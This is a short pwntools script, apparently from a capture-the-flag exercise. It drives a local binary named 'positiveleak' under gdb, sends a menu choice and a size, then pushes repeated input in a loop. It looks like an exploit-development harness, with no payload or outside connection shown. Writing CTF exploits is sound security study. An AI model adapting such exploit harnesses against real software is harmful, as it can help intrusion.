from pwn import *
import time

context.terminal = ['tmux','splitw','-h']
context.log_level = "debug"
r = process("./positiveleak")
gdb.attach(r, """b main
""")

r.send("0")
r.recvuntil("?> ")
r.send("200")
r.recvuntil("#> ")
r.send("")
for i in range(200):
	r.send("1234")
	time.sleep(0.1)


r.interactive()
